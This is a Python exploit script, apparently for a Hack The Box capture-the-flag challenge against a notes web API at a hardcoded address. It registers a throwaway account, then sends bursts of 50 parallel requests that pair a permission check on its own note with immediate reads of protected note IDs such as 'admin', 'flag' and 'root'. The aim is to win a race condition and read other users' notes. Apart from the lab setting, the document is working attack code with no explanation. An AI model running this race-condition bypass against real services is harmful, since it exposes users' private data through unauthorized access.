#!/usr/bin/env python3
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

BASE_URL = "http://83.136.255.203:47148"

# Create fresh user
email = f"massive{int(time.time())}@test.com"
r = requests.post(f"{BASE_URL}/api/auth/register", 
                 json={"email": email, "password": "test123"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

# Get my notes
my_notes = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes']
my_note = my_notes[0]['id']

print(f"[*] Fresh user: {email}")
print(f"[*] My note: {my_note}")

# Protected IDs that exist in the system
protected_ids = [
    "admin", "administrator", "htb", "challenge", "secret", "hidden",
    "d3vnu11", "flag", "FLAG", "root", "system"
]

print(f"[*] Testing {len(protected_ids)} protected IDs with massive parallel requests...")

def exploit_id(target_id):
    """Try to exploit a specific ID with many parallel attempts"""
    results = []
    
    def single_attempt(attempt_num):
        # Call check-permission
        requests.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", headers=headers)
        # IMMEDIATELY try to access target (no delay)
        r = requests.get(f"{BASE_URL}/api/notes/{target_id}", headers=headers)
        return (attempt_num, r.json())
    
    # Run 50 parallel attempts
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(single_attempt, i) for i in range(50)]
        
        for future in as_completed(futures):
            attempt, result = future.result()
            if result.get('success'):
                note = result.get('note', {})
                results.append((target_id, note))
                return results
    
    return results

# Test each ID
found_flags = []

for target_id in protected_ids:
    print(f"\n[*] Exploiting ID: {target_id}")
    results = exploit_id(target_id)
    
    if results:
        for note_id, note in results:
            content = note.get('content', '')
            title = note.get('title', '')
            
            print(f"  [+] SUCCESS!")
            print(f"      Title: {title}")
            print(f"      Content: {content}")
            
            if 'HTB{' in content:
                print(f"\n  [!!!!!!] FLAG FOUND: {content}")
                found_flags.append(content)
                break
    else:
        print(f"  [-] Failed to access")

print(f"\n[*] Exploit complete")
if found_flags:
    print(f"\n[!!!] FLAGS FOUND:")
    for flag in found_flags:
        print(f"  {flag}")
else:
    print("[*] No flags found")
